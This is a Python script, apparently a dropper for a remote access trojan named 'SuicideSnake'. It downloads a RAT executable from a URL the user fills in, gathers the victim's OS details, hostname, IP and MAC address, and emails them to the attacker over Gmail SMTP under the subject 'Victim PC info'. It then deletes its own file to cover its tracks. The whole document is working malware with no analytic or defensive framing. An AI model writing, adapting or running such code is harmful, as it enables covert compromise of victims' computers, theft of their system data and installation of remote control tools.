#Import libs and dependancies for getting system info and downloading rest of rat
import os, atexit, urllib.request, platform, socket, re, uuid, json, logging, time

#Import libs and dependancies for compiling and sending email
from email.message import EmailMessage
import smtplib

#Estabishing vars for email
sender = "Sender email"
password = "Sender password"
receiver = "Receiver email"
open("info.txt", "w")

#Crafting email
msg = EmailMessage()
msg['Subject'] = "Victim PC info"
msg['From'] = sender
msg['To'] = receiver
msg.set_content('PC Info below...')

#Dowload Client.py into the working directory of current script (SuicideSnake)
url = "FILL WITH RAT FILE URL (Use a file host that supports download links)"
urllib.request.urlretrieve(url, os.getcwd() + "\Client.exe")
print("Downloaded Client.exe...")

#Grab system info... shameless copy and past from stackoverflow.com/questions/3103178/how-to-get-the-system-info-with-python (Comment by YJDev)
system = "System: " + platform.system()
release = "Release: " + platform.release()
version = "Version: " + platform.version()
architecture = "Architecture: " + platform.machine()
hostname = "Hostname: " + socket.gethostname()
ip_add = "IP Address: " + socket.gethostbyname(socket.gethostname())
mac_add = "Mac Address: " + ':'.join(re.findall('..', '%012x' % uuid.getnode()))
info = (system + "   " + release + "   " + version + "   " + architecture + "   " + hostname + "   " + ip_add + "   " + mac_add)
print("Grabbed system info...")

#Create info.txt to contain info var gathered before
with open("info.txt", "w") as f:
    f.write(info)
print("Created info.txt and appended previously grabbed info...")

#Creating attachment
with open("info.txt", "rb") as f:
    file_data = f.read()
    file_name = f.name
msg.add_attachment(file_data, maintype="text", subtype="plain", filename=file_name)
print("Attached info.txt to email...")

#Establishing email
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    smtp.login(sender, password)
    smtp.send_message(msg)
print("Successfully sent email...")

#Deleting info.txt
os.remove("info.txt")
print("Deleted txt file...")

#Deletes current script (SucicideSnake.py) after execution
atexit.register(lambda file = __file__: os.remove(file))
